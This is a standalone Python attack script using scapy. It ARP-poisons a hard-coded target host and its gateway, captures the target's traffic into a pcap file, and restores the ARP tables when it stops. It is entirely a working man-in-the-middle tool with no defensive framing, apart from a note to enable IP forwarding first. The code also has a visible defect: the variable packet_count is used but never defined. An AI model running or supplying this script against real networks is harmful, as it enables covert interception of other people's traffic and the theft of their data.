#!/bin/python3
from scapy.all import *
import os
import sys
import threading
import signal

'''
Before Performing this attack enter the following command:

echo 1 > /proc/sys/net/ipv4/ip_forward

'''

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # Slightly different method
    print("[*] Restoring Target...")

    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # Signals the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    # Return the MAC Address from a response
    for s, r in responses:
        return r[Ether].src

    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP Poisoning. [CTRL+C to stop")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print("[*] ARP poison attack finished")
    return


interface = "eth0"
target_ip = "192.168.29.166"
gateway_ip = "192.168.29.1"

# Set our interface
conf.iface = interface

# Turn off output
conf.verb = 0

print("[*] Setting up %s" % interface)

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting")
    sys.exit(0)
else:
    print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to get target MAC. Exiting")
    sys.exit(0)
else:
    print("[*] Target %s is at %s" % (target_ip, target_mac))


# Start poison thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for %d packets" % packet_count)

    bpf_filter = "ip host %s" % target_ip

    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    # Write out captured packets
    wrpcap('arper.pcap', packets)

    # Restore Network
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    # Restore the target
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
